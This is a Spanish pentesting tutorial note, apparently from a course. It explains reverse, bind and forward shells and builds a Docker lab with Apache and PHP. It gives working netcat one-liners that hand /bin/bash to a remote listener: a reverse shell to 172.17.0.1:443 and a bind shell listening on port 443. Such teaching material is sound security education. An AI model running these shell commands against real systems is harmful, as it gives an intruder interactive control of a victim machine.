En esta clase, veremos las diferencias entre Reverse Shell, Bind Shell y Forward Shell:

- **Reverse Shell**: Es una t√©cnica que permite a un atacante conectarse a una m√°quina remota desde una m√°quina de su propiedad. Es decir, se establece una conexi√≥n desde la m√°quina comprometida hacia la m√°quina del atacante. Esto se logra ejecutando un programa malicioso o una instrucci√≥n espec√≠fica en la m√°quina remota que establece la conexi√≥n de vuelta hacia la m√°quina del atacante, permiti√©ndole tomar el control de la m√°quina remota.

- **Bind Shell**: Esta t√©cnica es el opuesto de la Reverse Shell, ya que en lugar de que la m√°quina comprometida se conecte a la m√°quina del atacante, es el atacante quien se conecta a la m√°quina comprometida. El atacante escucha en un puerto determinado y la m√°quina comprometida acepta la conexi√≥n entrante en ese puerto. El atacante luego tiene acceso por consola a la m√°quina comprometida, lo que le permite tomar el control de la misma.

- **Forward Shell**: Esta t√©cnica se utiliza cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall implementadas en la red. Se logra mediante el uso de¬†**mkfifo**, que crea un archivo¬†**FIFO**¬†(**named pipe**), que se utiliza como una especie de ‚Äú**consola simulada**‚Äù interactiva a trav√©s de la cual el atacante puede operar en la m√°quina remota. En lugar de establecer una conexi√≥n directa, el atacante redirige el tr√°fico a trav√©s del archivo¬†**FIFO**, lo que permite la comunicaci√≥n bidireccional con la m√°quina remota.

Es importante entender las diferencias entre estas t√©cnicas para poder determinar cu√°l es la mejor opci√≥n en funci√≥n del escenario de ataque y las limitaciones de la red.

## Crear Entorno en Docker
### Crear un Docker file
```dockerfile
FROM ubuntu:latest

ENV DEBIAN_FRONTEND noninteractive

RUN apt update && apt install -y apache2 \
  php

EXPOSE 80

ENTRYPOINT service apache2 start && /bin/bash
```
#### Ejecutar 
```bash
## Contruir Imagen
docker build -t my_image .

## Construir contenedor
docker run -dit -p 80:80 --cap-add=NET_admin --name myContainer my_image

## Ejecutar contenedor
docker exec -it myContainer bash 
```
## Reverse Shell
```bash
## Maquina Atacante
nc -nlvp 443

## Maquina Victima
ncat -e /bin/bash <IP-Atacante> <PORT>
# Ejemplo üëá
ncat -e /bin/bash 172.17.0.1 443

## Poner un prompt en la consola interactiva
script -c /dev/null -c bash
```
## Bind Shell (Victima ofrece una Shell)
```bash
## Maquina Victima
ncat -nlvp 443 -e /bin/bash

## Maquina Atacante
nc <IP-Victima> <PORT>
```